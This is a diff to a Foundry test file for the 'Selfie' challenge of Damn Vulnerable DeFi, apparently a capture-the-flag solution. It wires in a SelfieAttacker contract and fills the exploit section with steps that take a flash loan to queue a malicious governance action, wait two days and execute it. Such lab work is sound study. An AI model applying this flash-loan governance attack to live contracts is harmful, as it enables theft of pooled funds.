@@ -8,6 +8,8 @@ import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableToke
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
 
+import {SelfieAttacker} from "../../../src/Contracts/selfie/SelfieAttacker.sol";
+
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
     uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;
@@ -17,6 +19,8 @@ contract Selfie is Test {
     SelfiePool internal selfiePool;
     DamnValuableTokenSnapshot internal dvtSnapshot;
     address payable internal attacker;
+
+    SelfieAttacker internal selfieAttacker;
 
     function setUp() public {
         utils = new Utilities();
@@ -40,6 +44,11 @@ contract Selfie is Test {
 
         assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);
 
+
+        selfieAttacker = new SelfieAttacker(address(dvtSnapshot),address(dvtSnapshot), address(simpleGovernance),address(selfiePool), attacker );
+      
+
+
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
@@ -47,6 +56,15 @@ contract Selfie is Test {
         /**
          * EXPLOIT START *
          */
+        //set up attack take flashloan, queue malicious call, return flashloan, then waitt 
+        vm.prank(attacker);
+        selfieAttacker.initiateAttack();
+        
+
+        vm.warp(block.timestamp + 2 days);
+
+        vm.prank(attacker);
+        selfieAttacker.executeAttack();
 
         /**
          * EXPLOIT END *
